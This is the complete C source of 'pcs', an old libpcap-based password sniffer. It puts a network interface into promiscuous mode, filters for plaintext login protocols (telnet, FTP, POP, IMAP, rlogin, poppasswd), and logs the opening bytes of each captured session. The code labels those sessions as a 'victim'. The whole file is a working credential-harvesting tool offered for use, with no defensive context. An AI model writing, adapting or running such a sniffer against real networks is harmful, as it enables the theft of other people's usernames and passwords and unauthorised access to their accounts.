/*
pcs - libpcap based sniffer

* Supports multiple interface types now, thanks to jaeger@dhp.com
* Supports PPP (sorta), just filtering doesnt work

-halflife
*/

#define FILTERPROG      "\
tcp and (dst port 23 or dst port 21 or dst port 109 or dst port 110 \
or dst port 513 or dst port 143 or dst port 106)"

#define CAPTLEN         512
#define TIMEOUT         90

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#ifdef LINSUX
#include <ctype.h>
#include <netinet/in.h>
#include "linux-include/netinet/in_systm.h"
#include "linux-include/netinet/ip.h"
#include "linux-include/netinet/tcp.h"
#else
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#endif
#include <arpa/inet.h>
#include <pcap.h>

#ifdef NO_BCOPY
#define bcopy(s, d, n) memcpy(d, s, n)
#endif

int fddipad;
pcap_t *ip_socket;
FILE *logfile;
int dlt_len = 0;
int broked_ppp = 0;

void filter_packet(u_char *, struct pcap_pkthdr *, u_char *);
char *hostlookup(unsigned int);
void print_header(void);
void print_data(char *, int);
void die(int);
void timeout(int);

struct victim
{
   unsigned int srcaddr;
   unsigned int dstaddr;
   unsigned short srcport;
   unsigned short dstport;
   int bytes_read;
   char active;
} victim;

main(int argc, char **argv)
{
   char *interface=NULL;
   char *myfilter=FILTERPROG;
   char errbuf[PCAP_ERRBUF_SIZE];
   struct bpf_program prog;
   u_long network, netmask;
   int c;
   int promisc = 1;
   extern int opterr;   
   extern char *optarg;
   
   logfile = stdout;
   opterr = 0;   
   victim.active = 0;   
   while((c = getopt(argc, argv, "phf:i:o:")) != -1)
   {
      switch(c)
      {
         case 'o':
            logfile = fopen(optarg, "at");
            if(logfile == NULL) logfile = stdout;
            break;
         case 'i':
            interface = optarg;
            break;
         case 'p':
            promisc=0;
            break;
         case 'f':
            myfilter = optarg;
            break;
         case 'h':
            fprintf(stderr, "%s [-h] [-p] [-i interface] [-o logfile] [-f filter]\n", argv[0]);
            exit(0);                     
      }
   }
   signal(SIGHUP, SIG_IGN);
   signal(SIGINT, die);
   signal(SIGQUIT, die);
   signal(SIGTERM, die);
   
   if(interface == NULL)
   {
      interface = pcap_lookupdev(errbuf);
      if(interface == NULL)
      {
         fprintf(stderr, "pcap_lookupdev: %s\n", errbuf);
         exit(0);
      }
   }
   if(pcap_lookupnet(interface, &network, &netmask, errbuf) < 0)
   {
      fprintf(stderr, "pcap_lookupnet: %s\n", errbuf);
      exit(0);
   }
   ip_socket = pcap_open_live(interface, 1024, promisc, 1024, errbuf);
   if(ip_socket == NULL)
   {
      fprintf(stderr, "pcap_open_live: %s\n", errbuf);
      exit(0);
   }
   switch(pcap_datalink(ip_socket))
   {
      case DLT_EN10MB:      
         dlt_len = 14;
         break;
      case DLT_SLIP:
         dlt_len = 16;
         break;
      case DLT_PPP:
         fprintf(stderr, "Filtering is slightly broke in PPP, to change\n");
         fprintf(stderr, "the filtering, you must edit filter_packet()\n\n");
         fflush(stderr);
         myfilter = NULL;
         dlt_len = 4;
         broked_ppp = 1;
         break;
      case DLT_FDDI:
         fprintf(stderr, "If you want FDDI, do it y'self!\n");
         die(0);
      default:      
         dlt_len = 4;
         break;   
   }
   if(pcap_compile(ip_socket, &prog, myfilter, 1, netmask) < 0)
   {
      fprintf(stderr, "pcap_compile: %s\n", errbuf);
      die(1);
   }
   if(pcap_setfilter(ip_socket, &prog) < 0)
   {
      fprintf(stderr, "pcap_setfilter: %s\n", errbuf);
      die(1);
   }   
   fprintf(logfile, "interface: %s, pid: %d\nfilter: %s\n", interface, getpid(), myfilter);
   if(logfile != stdout) fprintf(stderr, "interface: %s, pid: %d\nfilter: %s\n", interface, getpid(), myfilter);
   fflush(logfile);
   while(1)
      pcap_loop(ip_socket, -1, (pcap_handler)filter_packet, NULL);
}

void filter_packet(u_char *u, struct pcap_pkthdr *p, u_char *packet)
{
   #define IP_SIZE	20
   #define TCP_SIZE	20
   unsigned short ip_options = 0;
   unsigned short tcp_options = 0;
   int data_size = 0;
   struct ip *ip;
   struct tcphdr *tcp;
   u_char *data;
   static u_char *align_buf=NULL;

   if(p->len < (dlt_len + IP_SIZE + TCP_SIZE)) return;
   ip = (struct ip *)(packet + dlt_len);
   if(align_buf == NULL) align_buf = (u_char *)malloc(1024);
   bcopy((char *)ip, (char *)align_buf, p->len);
   packet = align_buf;
   ip = (struct ip *)align_buf;
   ip_options = ip->ip_hl;
   ip_options -= 5;
   ip_options *= 4;
   tcp = (struct tcphdr *)(packet + IP_SIZE + ip_options);   
   if(broked_ppp > 0)
   {
      if(ip->ip_p != IPPROTO_TCP) return;
      switch(ntohs(tcp->th_dport))
      {
         case 23: break;
         case 21: break;
         case 109: break;
         case 110: break;
         case 513: break;
         case 143: break;
         case 106: break;
         default: return;
      }
   }   
   tcp_options = tcp->th_off;
   tcp_options -= 5;
   tcp_options *= 4;
   data = packet + (IP_SIZE + ip_options + TCP_SIZE + tcp_options);
   data_size = ntohs(ip->ip_len);
   data_size -= IP_SIZE;
   data_size -= TCP_SIZE;
   data_size -= ip_options;
   data_size -= tcp_options;

   if((tcp->th_flags & TH_RST) || (tcp->th_flags & TH_FIN) || (victim.bytes_read > CAPTLEN))
   {
      if(!victim.active) return;
      if(tcp->th_dport != victim.dstport) return;
      if(tcp->th_sport != victim.srcport) return;
      if(ip->ip_src.s_addr != victim.srcaddr) return;
      if(ip->ip_dst.s_addr != victim.dstaddr) return;
      fprintf(logfile, "[CLOSED]\n");
      fflush(logfile);
      victim.active = 0;
      victim.bytes_read = 0;
      alarm(0);
   }
   
   if(!victim.active && (tcp->th_flags & TH_SYN) && !(tcp->th_flags & TH_ACK))
   {
      victim.active = 1;
      victim.bytes_read = 0;
      victim.dstport = tcp->th_dport;
      victim.srcport = tcp->th_sport;
      victim.dstaddr = ip->ip_dst.s_addr;
      victim.srcaddr = ip->ip_src.s_addr;
      print_header();
      print_data(data, data_size);
      signal(SIGALRM, timeout);
      alarm(TIMEOUT);
      return;
   }
   if(!victim.active) return;
   if(tcp->th_flags & TH_SYN) return;
   if(tcp->th_dport != victim.dstport) return;
   if(tcp->th_sport != victim.srcport) return;
   if(ip->ip_src.s_addr != victim.srcaddr) return;
   if(ip->ip_dst.s_addr != victim.dstaddr) return;
   print_data(data, data_size);
   return;
}

char *hostlookup(unsigned int in)
{
   static char blah[1024];
   struct in_addr i;
   struct hostent *he = NULL;

   i.s_addr=in;
#ifndef NO_RESOLVE   
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
#endif   
   if(he == NULL) strcpy(blah, inet_ntoa(i));
   else strncpy(blah, he->h_name, 1000);
   return blah;
}

void print_header(void)
{
   time_t thetime;
   struct tm *timeptr;
   char *portname;
   int verboseport=0;

   switch(ntohs(victim.dstport))
   {
      case 21: portname="ftp";verboseport++;break;
      case 23: portname="telnet";verboseport++;break;
      case 25: portname="smtp";verboseport++;break;
      case 106: portname="poppasswd";verboseport++;break;
      case 109: portname="pop2";verboseport++;break;
      case 110: portname="pop3";verboseport++;break;
      case 143: portname="imap2";verboseport++;break;
      case 513: portname="rlogin";verboseport++;break;
      case 514: portname="rsh";verboseport++;break;
   }                                                                                                   
   time(&thetime);
   timeptr = localtime(&thetime);
   fprintf(logfile, "---\n");
   fprintf(logfile, "PATH: %s(%u) => ", hostlookup(victim.srcaddr), ntohs(victim.srcport));
   if(!verboseport)   
      fprintf(logfile, "%s(%u)\n", hostlookup(victim.dstaddr), ntohs(victim.dstport));
   else
      fprintf(logfile, "%s(%s)\n", hostlookup(victim.dstaddr), portname);
   fprintf(logfile, "DATE: %s\n", asctime(timeptr));
   fflush(logfile);
}

void print_data(char *data, int datalen)
{
   static unsigned char lastc=0;
   victim.bytes_read = victim.bytes_read + datalen;
   while(datalen-- > 0)
   {
      if(*data < 32)
      {
         switch(*data)
         {
            case '\0':if((lastc=='\r') || (lastc=='\n') || lastc=='\0') break;
            case '\r':
            case '\n':
               if((lastc == '\r') || (lastc=='\n'));
               else fprintf(logfile, "\n");
               break;
            default:fprintf(logfile, "^%c",(*data + 64));break;
         }
      }
      else
      {
         if(isprint(*data)) fputc(*data, logfile);
         else fprintf(logfile, "(%d)", *data);
      }
      lastc=*data++;
   }
   fflush(logfile);
}

void die(int s)
{
   time_t closetime;
   struct tm *timeptr;
   
   time(&closetime);
   timeptr = localtime(&closetime);
   fprintf(logfile, "Log closed on %s\n", asctime(timeptr));
   fflush(logfile);
   fclose(logfile);
   pcap_close(ip_socket);
   exit(0);
}

void timeout(int s)
{
   victim.active = 0;
   victim.bytes_read = 0;
   fprintf(logfile, "[TIMEOUT]\n");
   alarm(0);
   fflush(logfile);
}
